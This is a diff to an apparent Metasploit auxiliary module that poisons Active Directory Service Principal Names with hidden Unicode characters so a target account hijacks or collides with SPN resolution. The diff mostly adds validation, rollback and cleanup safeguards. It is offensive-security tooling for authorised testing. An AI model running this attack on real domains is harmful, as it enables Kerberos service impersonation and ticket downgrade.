@@ -80,12 +80,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def validate
+    super
+
     errors = {}
     if datastore['TARGET_DN'].blank? && datastore['TARGET_ACCOUNT'].blank?
       errors['TARGET_DN'] = 'Set TARGET_DN or TARGET_ACCOUNT.'
     end
-    if action.name != 'CHECK' && datastore['SPN'].blank?
-      errors['SPN'] = "The #{action.name} action requires SPN."
+    if action.name != 'CHECK'
+      if datastore['SPN'].blank?
+        errors['SPN'] = "The #{action.name} action requires SPN."
+      elsif !clean_spn?(datastore['SPN'])
+        errors['SPN'] = 'SPN already contains a comparison-ignorable character; set the clean SPN instead.'
+      end
     end
 
     raise Msf::OptionValidateError, errors unless errors.empty?
@@ -145,24 +151,37 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Adding #{visible_value(hidden_spn)} to #{@target_dn}")
     add_spn(@target_dn, hidden_spn)
-    after = spn_owners(clean_spn)
-    classification = classify_resolution(before, after, @target_dn)
 
-    case classification
-    when :hijack
-      print_good("The clean SPN now resolves to the target account in LDAP: #{@target_dn}")
-    when :collision
-      print_good('The clean SPN now has multiple LDAP owners, creating a collision and downgrade condition.')
-    else
-      print_warning('The hidden-character SPN did not alter clean-SPN resolution; rolling it back.')
-      delete_spn(@target_dn, hidden_spn)
+    # Anything that leaves this block without an effective result, including a failed
+    # verification query, has to take the newly written value back out again.
+    keep_spn = false
+    begin
+      classification = classify_resolution(before, spn_owners(clean_spn), @target_dn)
+      keep_spn = %i[hijack collision].include?(classification)
+
+      case classification
+      when :hijack
+        print_good("The clean SPN now resolves to the target account in LDAP: #{@target_dn}")
+      when :collision
+        print_good('The clean SPN now has multiple LDAP owners, creating a collision and downgrade condition.')
+      else
+        print_warning('The hidden-character SPN did not alter clean-SPN resolution; rolling it back.')
+      end
+
+      print_warning('Request and decrypt a service ticket before treating LDAP resolution as cryptographic proof.') if keep_spn
+    ensure
+      rollback_spn(@target_dn, hidden_spn) unless keep_spn
     end
-
-    print_warning('Request and decrypt a service ticket before treating LDAP resolution as cryptographic proof.') if %i[hijack collision].include?(classification)
   end
 
   def action_cleanup
     hidden_spn = poisoned_spn(datastore['SPN'], datastore['UNICODE_CODEPOINT'])
+    unless target_spns(@target_dn).include?(hidden_spn)
+      print_status("#{@target_dn} does not contain #{visible_value(hidden_spn)}; nothing to remove.")
+      return
+    end
+
+    print_warning("CLEANUP removes #{visible_value(hidden_spn)} even if this module did not add it; confirm that the value is not a legitimate SPN before continuing.")
     print_status("Removing #{visible_value(hidden_spn)} from #{@target_dn}")
     delete_spn(@target_dn, hidden_spn)
     print_good('The exact hidden-character SPN was removed.')
@@ -194,13 +213,31 @@ class MetasploitModule < Msf::Auxiliary
     value.delete(COMPARISON_IGNORABLE_CHARACTERS).downcase
   end
 
+  # A clean SPN is one the DC compares verbatim. If the operator supplied a value that
+  # already carries an ignorable codepoint, every "clean" query in this module would
+  # silently be a query for a poisoned value instead.
+  def clean_spn?(value)
+    normalize_kerberloss_value(value) == value.downcase
+  end
+
   def classify_resolution(owners_before, owners_after, target_object_dn)
     normalized_target_dn = target_object_dn.downcase
+    normalized_before = owners_before.map(&:downcase).uniq
     normalized_after = owners_after.map(&:downcase).uniq
+    return :ineffective if normalized_before.include?(normalized_target_dn)
+    return :ineffective unless normalized_after.include?(normalized_target_dn)
     return :collision if normalized_after.length > 1
-    return :hijack if normalized_after == [normalized_target_dn] && owners_before.none? { |owner| owner.casecmp?(target_object_dn) }
 
-    :ineffective
+    :hijack
+  end
+
+  def rollback_spn(object_dn, spn)
+    delete_spn(object_dn, spn)
+    print_status("Rolled back #{visible_value(spn)}.")
+    true
+  rescue ::StandardError => e
+    print_error("Couldn't roll back #{visible_value(spn)} on #{object_dn} (#{e.class}: #{e.message}); remove it manually.")
+    false
   end
 
   def with_temporary_spn(object_dn, spn)
